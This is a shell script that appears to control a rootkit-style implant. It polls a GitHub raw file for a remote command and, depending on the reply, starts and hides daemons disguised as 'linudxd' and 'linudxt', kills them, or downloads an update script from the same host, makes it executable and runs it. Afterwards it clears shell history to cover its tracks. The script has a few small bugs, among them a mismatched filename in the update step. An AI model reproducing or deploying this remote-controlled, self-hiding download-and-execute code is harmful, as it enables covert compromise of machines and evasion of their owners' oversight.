#! /bin/sh

wget https://raw.githubusercontent.com/myvulweb/b3/master/1.txt -O /tmp/b3-singal-test.txt
ret=`cat /tmp/b3-singal-test.txt`
rm -rf /tmp/b3-singal-test.txt

cur_ver=`cat /bin/linudx-ver.txt`
echo $cur_ver
echo $ret

p1=`cat /bin/linudx-pids | awk '{print $1}'`
p2=`cat /bin/linudx-pids | awk '{print $2}'`
p3=`cat /bin/linudx-pids | awk '{print $3}'`

if [ "$ret" -eq 1 ]
then
	echo "start"

	if [ "`pidof linudxd`" ];then
		echo "already show linudxd"
	else
		/linudx/linudx_cmd show $p1
	fi

	if [ "`pidof linudxd`" ];then
		echo "shwo linudxd success check one"
	else
		/linudx/linudx_cmd show
	fi

	if [ "`pidof linudxd`" ];then
		echo "show linudxd success check two" 
	else
		echo "show linudxd failed"
	fi

	if [ `ps -ef|grep /bin/linudxd | grep -v grep |wc -l`  -ge 1 ];then
		echo "already started linudxd"

		/linudx/linudx_cmd hide $p1

		if [ "`pidof linudxd`" ];then
  			/linudx/linudx_cmd hide   
		else
  			echo "hide linudxd success check one"
		fi

		if [ "`pidof linudxd`" ];then
  			echo "hide linudxd failed"
		else
  			echo "hide linudxd sucess check two" 
		fi
	else
		echo "need to start linudxd"
		/bin/linudxd &
		p1=`pidof linudxd`
		/linudx/linudx_cmd hide $p1

		if [ "`pidof linudxd`" ];then
			/linudx/linudx_cmd hide 
		else
			echo "hide linudxt success check1"
		fi

		if [ "`pidof linudxd`" ];then
			echo "hide linudxt failed" 
		else
			echo "hide linudxt success check2"
		fi
	fi

	if [ "`pidof linudxt`" ];then
		echo "already show linudxt"
	else
		/linudx/linudx_cmd show $p2
	fi

	if [ "`pidof linudxt`" ];then
		echo "show linudxt sucess check one"
	else
		/linudx/linudx_cmd show
	fi

	if [ "`pidof linudxt`" ];then
		echo "show linudxt success check two" 
	else
		echo "show linudxt failed"
	fi

	if [ `ps -ef|grep /bin/linudxt | grep -v grep |wc -l`  -ge 1 ];then
		echo "already started linudxt"

		/linudx/linudx_cmd hide $p2
		if [ "`pidof linudxt`" ];then
  			/linudx/linudx_cmd hide   
		else
  			echo "hide linudxt success one"
		fi

		if [ "`pidof linudxt`" ];then
  			echo "hide linudxt failed"
		else
  			echo "hide linudxt sucess two" 
		fi
	else
		echo "need to start linudxt"
		/bin/linudxt &
		p2= `pidof linudxt`
		/linudx/linudx_cmd hide $p2

		if [ "`pidof linudxt`" ];then
			/linudx/linudx_cmd hide 
		else
			echo "hide linudxt success check1"
		fi

		if [ "`pidof linudxt`" ];then
			echo "hide linudxt failed" 
		else
			echo "hide linudxt success check2"
		fi
	fi
	sleep 1
	echo "$p1 $p2 $p3" > /bin/linudx-pids

elif [ "$ret" -eq 0 ]
then
	echo "need to stop all"
	kill -9 $p1
	kill -9 $p2

elif [ "$ret" -gt "$cur_ver" ]
then
	echo "need to update"
	wget https://raw.githubusercontent.com/myvulweb/b3/master/in.sh -O /tmp/b3-in.sh
	chmod 777 /tmp/b3-in.sh
	/tmp/b2-in.sh
	rm -rf /tmp/b3-in.sh
	history -c

else
	echo "not defined!"
fi


